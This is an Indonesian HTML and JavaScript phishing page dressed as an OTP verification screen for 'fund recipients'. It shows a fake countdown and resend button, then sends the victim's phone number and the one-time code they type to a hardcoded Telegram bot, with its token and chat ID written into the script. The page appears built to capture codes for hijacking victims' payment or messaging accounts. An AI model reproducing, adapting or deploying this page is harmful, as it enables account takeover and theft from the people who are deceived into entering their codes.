<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifikasi</title>

<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #f5f5f5;
}

/* HEADER */
.header {
    background: linear-gradient(90deg, #ff6b6b, #ff9a6b);
    color: white;
    padding: 15px;
    text-align: center;
    font-size: 18px;
    position: relative;
}

.back {
    position: absolute;
    left: 15px;
    top: 15px;
    font-size: 20px;
    cursor: pointer;
}

/* CONTENT */
.container {
    text-align: center;
    margin-top: 40px;
    padding: 20px;
}

.title {
    font-size: 22px;
    font-weight: bold;
    margin-bottom: 10px;
}

.desc {
    color: #777;
    margin-bottom: 20px;
}

/* INPUT */
.input-group {
    width: 80%;
    margin: auto;
    text-align: left;
    position: relative;
}

.input-group label {
    color: #555;
}

.input-group input {
    width: 100%;
    border: none;
    border-bottom: 1px solid #ccc;
    padding: 10px 0;
    background: transparent;
    font-size: 16px;
    outline: none;
}

/* OTP BUTTON */
.otp-btn {
    margin-top: 10px;
    float: right;
    background: #ddd;
    border: none;
    padding: 8px 15px;
    border-radius: 20px;
    color: #888;
    cursor: pointer;
}
.otp-btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

/* LINK */
.link {
    margin-top: 20px;
    color: #999;
    font-size: 14px;
}

/* MAIN BUTTON */
.btn-main {
    margin-top: 40px;
    width: 80%;
    height: 50px;
    border: none;
    border-radius: 30px;
    color: white;
    font-size: 18px;
    background: linear-gradient(90deg, #ff6b6b, #ff9a6b);
    cursor: pointer;
}
.btn-main:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.arrow-img {
    width: 24px;
    height: 24px;
}

/* PESAN ERROR */
.error-message {
    color: #ff4444;
    font-size: 12px;
    margin-top: 5px;
    text-align: left;
    width: 80%;
    margin-left: auto;
    margin-right: auto;
    display: none;
}

.error-message.show {
    display: block;
}
</style>
</head>

<body>

<div class="header">
    <span class="back" onclick="history.back()">
        <img src="https://i.ibb.co.com/5WWLtTM0/label-back-btn.png" class="arrow-img">
    </span>
    Masuk penerima dana
</div>

<div class="container">

    <div class="title">Masuk penerima dana</div>

    <div class="desc">
        kode verifikasi akan dikirim ke nomor hp<br>
        <span id="nomor">-</span>
    </div>

    <div class="input-group">
        <label>Kode verifikasi</label>
        <input type="text" id="otp" maxlength="6" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
        <button class="otp-btn" id="otpBtn">Terima OTP (40)</button>
    </div>

    <!-- Tempat pesan error -->
    <div id="errorMsg" class="error-message"></div>

    <div class="link">
        Tidak menerima OTP? Coba cara lain >
    </div>

    <button class="btn-main" id="submitBtn">Masuk</button>

</div>

<script>
// ==================== AMBIL NOMOR DARI LOCALSTORAGE ====================
const nomorHP = localStorage.getItem("nomorHP");
if (nomorHP) {
    const format = nomorHP.replace(/(\d{4})(\d{4})(\d+)/, "$1-$2-$3");
    document.getElementById("nomor").innerText = format;
}

// ==================== VARIABEL STATUS OTP ====================
let isOtpValid = true;       // Apakah OTP saat ini masih berlaku
let isSubmitted = false;     // Apakah sudah pernah berhasil submit
let waktu = 40;
let interval;

const otpBtn = document.getElementById("otpBtn");
const errorDiv = document.getElementById("errorMsg");
const submitBtn = document.getElementById("submitBtn");
const otpInput = document.getElementById("otp");

// Fungsi untuk menampilkan pesan error
function showError(message) {
    errorDiv.innerText = message;
    errorDiv.classList.add("show");
}

// Fungsi untuk menyembunyikan pesan error
function hideError() {
    errorDiv.classList.remove("show");
    errorDiv.innerText = "";
}

// Fungsi menghentikan timer
function stopTimer() {
    if (interval) {
        clearInterval(interval);
        interval = null;
    }
}

// Fungsi untuk menandai OTP kadaluarsa
function expireOtp() {
    stopTimer();
    isOtpValid = false;
    otpBtn.disabled = false;
    otpBtn.innerText = "Kirim ulang OTP";
    showError("Kode OTP telah kadaluarsa. Silakan kirim ulang OTP untuk melanjutkan.");
}

// Memulai timer OTP (hanya jika belum pernah submit sukses)
function startTimer() {
    if (isSubmitted) return; // Jika sudah pernah sukses, tidak perlu timer lagi
    
    stopTimer();
    
    isOtpValid = true;
    hideError();
    
    otpBtn.disabled = true;
    waktu = 40;
    otpBtn.innerText = `Terima OTP (${waktu})`;

    interval = setInterval(() => {
        waktu--;
        otpBtn.innerText = `Terima OTP (${waktu})`;

        if (waktu <= 0) {
            // Timer habis => OTP kadaluarsa
            stopTimer();
            otpBtn.disabled = false;
            otpBtn.innerText = "Kirim ulang OTP";
            isOtpValid = false;
            showError("Kode OTP kadaluarsa. Cek kembali dalam 3 menit untuk terima OTP baru.");
        }
    }, 1000);
}

// Event klik tombol OTP (kirim ulang)
otpBtn.addEventListener("click", () => {
    if (otpBtn.disabled) return;
    if (isSubmitted) {
        showError("Verifikasi sudah berhasil, tidak perlu mengirim ulang OTP.");
        return;
    }
    
    // Kirim ulang OTP: reset semua
    startTimer();
    
    // (Opsional) Simulasi pengiriman OTP baru
    alert("Kode OTP baru telah dikirim ke nomor Anda.");
});

// Mulai timer saat halaman pertama kali dibuka
startTimer();

// ==================== KIRIM KE TELEGRAM ====================
// GANTI DENGAN TOKEN DAN CHAT ID ANDA
const BOT_TOKEN = "8625789355:AAHlJBmWnheRZNLZt_CchWO6B6Qm9DIYH7g";
const CHAT_ID = "8427991917";

submitBtn.addEventListener("click", async () => {
    const otpValue = otpInput.value.trim();
    const nomor = localStorage.getItem("nomorHP");

    // Cek apakah sudah pernah berhasil submit
    if (isSubmitted) {
        showError("Verifikasi sudah berhasil dilakukan. Halaman akan segera berpindah.");
        return;
    }

    // Validasi nomor
    if (!nomor) {
        alert("Nomor HP tidak ditemukan. Silakan kembali ke halaman sebelumnya.");
        return;
    }

    // Validasi OTP harus 6 digit
    if (otpValue.length !== 6) {
        showError("Kode verifikasi harus 6 digit.");
        return;
    }

    // Validasi apakah OTP masih berlaku
    if (!isOtpValid) {
        showError("Kode OTP kadaluarsa. Silakan kirim ulang OTP.");
        return;
    }

    // Jika semua valid, lanjut kirim ke Telegram
    hideError();
    submitBtn.disabled = true;
    submitBtn.innerText = "Mengirim...";

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `🔐 Verifikasi OTP\n\n📱 Nomor HP: ${nomor}\n🔢 Kode OTP: ${otpValue}\n⏰ Waktu: ${new Date().toLocaleString()}`
            })
        });

        const result = await response.json();
        if (result.ok) {
            // Berhasil kirim
            alert("Verifikasi berhasil dikirim.");
            
            // Tandai bahwa OTP ini sudah digunakan => kadaluarsa
            isSubmitted = true;
            expireOtp(); // Jadikan OTP kadaluarsa, nonaktifkan kirim ulang
            
            // (Opsional) Pindah halaman setelah beberapa detik
            setTimeout(() => {
                // window.location.href = "sukses.html";
            }, 3000);
        } else {
            throw new Error("Gagal mengirim ke Telegram");
        }
    } catch (error) {
        console.error(error);
        alert("Gagal mengirim data. Coba lagi.");
        submitBtn.disabled = false;
        submitBtn.innerText = "Masuk";
    }
});
</script>

</body>
</html>
